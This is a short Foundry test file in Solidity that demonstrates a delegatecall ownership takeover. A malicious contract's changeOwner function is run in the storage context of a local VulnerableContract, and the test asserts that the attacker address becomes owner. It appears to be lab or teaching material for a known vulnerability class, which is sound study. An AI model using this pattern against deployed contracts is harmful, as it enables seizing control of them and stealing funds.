// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract DelegatecallExploitTest is Test {
    VulnerableContract public vulnerable;
    address hacker = address(this);
    MaliciousContract public malicious;

    function setUp() public {
        vulnerable = new VulnerableContract();
        malicious = new MaliciousContract();
    }

    function testDelegatecallExploit() public {
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", hacker);
        vulnerable.execute(address(malicious), data);

        assertEq(vulnerable.owner(), hacker, "Delegatecall exploit failed");
    }
}

contract MaliciousContract {
    address public owner;

    function changeOwner(address _newOwner) public {
        owner = _newOwner;
    }
}
